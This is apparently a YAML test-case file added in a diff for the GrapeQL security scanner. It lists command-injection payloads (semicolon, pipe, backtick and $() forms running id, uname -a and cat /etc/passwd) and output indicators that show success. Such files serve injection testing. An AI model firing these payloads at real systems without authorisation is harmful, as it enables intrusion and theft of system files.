@@ -1,0 +1,122 @@
+# GrapeQL Command Injection Test Cases
+
+test_cases:
+  # ── Basic Command Execution ────────────────────────────────────
+  - name: semicolon_id
+    payload: ";id"
+    indicators: &cmd_indicators
+      - "root:"
+      - "/bin/bash"
+      - "/bin/sh"
+      - ":/home/"
+      - "/usr/bin"
+      - "/var/log"
+      - "Permission denied"
+      - "command not found"
+      - "Linux"
+
+  - name: pipe_id
+    payload: "|id"
+    indicators: *cmd_indicators
+
+  - name: double_pipe_id
+    payload: "||id"
+    indicators: *cmd_indicators
+
+  - name: and_id
+    payload: "&& id"
+    indicators: *cmd_indicators
+
+  # ── File Reading ───────────────────────────────────────────────
+  - name: semicolon_cat_passwd
+    payload: ";cat /etc/passwd"
+    indicators: *cmd_indicators
+
+  - name: pipe_cat_passwd
+    payload: "|cat /etc/passwd"
+    indicators: *cmd_indicators
+
+  - name: double_pipe_cat_passwd
+    payload: "||cat /etc/passwd"
+    indicators: *cmd_indicators
+
+  - name: and_cat_passwd
+    payload: "&& cat /etc/passwd"
+    indicators: *cmd_indicators
+
+  # ── System Information ─────────────────────────────────────────
+  - name: semicolon_uname
+    payload: ";uname -a"
+    indicators: *cmd_indicators
+
+  - name: pipe_uname
+    payload: "|uname -a"
+    indicators: *cmd_indicators
+
+  - name: double_pipe_uname
+    payload: "||uname -a"
+    indicators: *cmd_indicators
+
+  - name: and_uname
+    payload: "&& uname -a"
+    indicators: *cmd_indicators
+
+  # ── Backtick variations ────────────────────────────────────────
+  - name: backtick_cat_passwd
+    payload: "`cat /etc/passwd`"
+    indicators: *cmd_indicators
+
+  - name: backtick_id
+    payload: "`id`"
+    indicators: *cmd_indicators
+
+  - name: backtick_uname
+    payload: "`uname -a`"
+    indicators: *cmd_indicators
+
+  # ── Dollar subshell ────────────────────────────────────────────
+  - name: dollar_cat_passwd
+    payload: "$(cat /etc/passwd)"
+    indicators: *cmd_indicators
+
+  - name: dollar_id
+    payload: "$(id)"
+    indicators: *cmd_indicators
+
+  - name: dollar_uname
+    payload: "$(uname -a)"
+    indicators: *cmd_indicators
+
+  - name: plain_uname
+    payload: "uname -a"
+    indicators: *cmd_indicators
+
+  # ── Chained commands ───────────────────────────────────────────
+  - name: chain_semicolon
+    payload: ";cat /etc/passwd;id"
+    indicators: *cmd_indicators
+
+  - name: chain_pipe
+    payload: "|cat /etc/passwd|id"
+    indicators: *cmd_indicators
+
+  - name: chain_and
+    payload: "&&cat /etc/passwd&&id"
+    indicators: *cmd_indicators
+
+  - name: plain_cat_passwd
+    payload: "cat /etc/passwd"
+    indicators: *cmd_indicators
+
+  # ── With spaces ────────────────────────────────────────────────
+  - name: space_semicolon_cat
+    payload: "; cat /etc/passwd"
+    indicators: *cmd_indicators
+
+  - name: space_pipe_cat
+    payload: "| cat /etc/passwd"
+    indicators: *cmd_indicators
+
+  - name: space_and_cat
+    payload: "&& cat /etc/passwd"
+    indicators: *cmd_indicators
